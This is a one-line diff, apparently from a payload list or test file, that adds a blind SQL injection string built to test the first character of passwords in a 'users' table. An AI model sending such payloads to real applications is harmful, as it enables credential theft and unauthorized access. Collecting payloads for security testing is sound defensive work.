@@ -1,0 +1,1 @@
+1' AND (SELECT SUBSTRING(password,1,1) FROM users)='a' --
